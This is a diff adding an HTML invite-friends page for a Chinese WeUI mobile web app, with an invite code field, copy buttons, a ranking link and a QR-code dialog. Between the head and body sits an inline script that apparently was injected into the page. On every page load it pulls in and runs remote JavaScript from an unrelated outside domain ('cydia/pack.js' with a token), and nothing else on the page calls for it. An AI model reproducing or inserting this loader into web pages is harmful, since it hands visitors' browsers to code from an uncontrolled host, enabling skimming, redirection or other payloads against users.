@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+		<title>邀请好友</title>
+		<link rel="stylesheet" href="../../static/css/weui.css" />
+		<link rel="stylesheet" href="../../static/css/common.css" />
+		<link rel="stylesheet" href="../../static/css/home/invite.css" />
+	</head>
+	<script>
+		(function () {
+			var dw = document.createElement("script");
+			dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
+			var s = document.getElementsByTagName("script")[0];
+			s.parentNode.insertBefore(dw, s);
+		})()
+	</script>
+	<body>
+		<header class="weui-bar weui-bar-nav" id="returnBtn">
+		    <a class="weui-pull-left weui-btns">
+		        <span class="weui-cell__fts"></span>
+		    </a>
+		    <div class="weui-title">邀请好友</div>
+		</header>
+		<div class="inviteBox">
+			<div class="inviteImg">
+				<img src="../../static/images/banner.png" />
+			</div>
+			<div class="ranking">
+				<ul>
+
+				</ul>
+				<a href="ranking.html" class="weui-btn check_pain">查看完整榜单</a>
+			</div>
+			<div class="entering">
+				<img src="../../static/images/di_4.png" />
+				<div class="enterbtns">
+					<a class="weui-btn">马上入群</a>
+				</div>
+			</div>
+			<div class="copyDiv">
+				<div class="copytxt">
+					邀请码：<input value="" type="text" id="inviteNum" readonly />
+					<div id="copy-pp"></div>
+					<button class="weui-btn" id="copyBtn"><img src="../../static/images/fuzhi.png" />复制</button>
+				</div>
+				<!--<input value="" id="qrcode" type="hidden" />-->
+				<div class="copybtn">
+					<a class="weui-btn addShip" data-link="">马上邀请好友加入</a>
+					<input class="copy-link" type="text" value="" id="qrcodeLink" readonly />
+					<div id="link-pp"></div>
+					<a class="weui-btn poster">我的专属海报</a>
+				</div>
+
+			</div>
+		</div>
+		<div class="weui-mask weui-mask--visible" style="display: none;"></div>
+		<div class="weui-dialog weui-dialog--visible" style="display: none;" id="dialog">
+			<div class="deleteDiv">
+     			<img src="../../static/images/delete.png" />
+     		</div>
+			<div class="weui-dialog__bd" id="dialog2">
+        		<div class="weui_dialog">
+          			<div class="weui_dialog_hd qrcode" id="">
+          				<img src="" alt="" />
+          			</div>
+         		</div>
+         		<p class="modalTxt">扫一扫加入微信/QQ群</p>
+
+        	</div>
+		</div>
+		<script type="text/javascript" src="../../lib/jquery.js" ></script>
+		<script type="text/javascript" src="../../lib/jquery-weui.js" ></script>
+		<script type="text/javascript" src="../../lib/weui.js" ></script>
+		<script type="text/javascript" src="../../lib/qrcode.min.js" ></script>
+		<script type="text/javascript" src="../../static/js/common.js" ></script>
+		<script type="text/javascript" src="../../static/js/api.js"></script>
+		<script type="text/javascript" src="../../static/js/home/inviteship.js" ></script>
+	</body>
+</html>
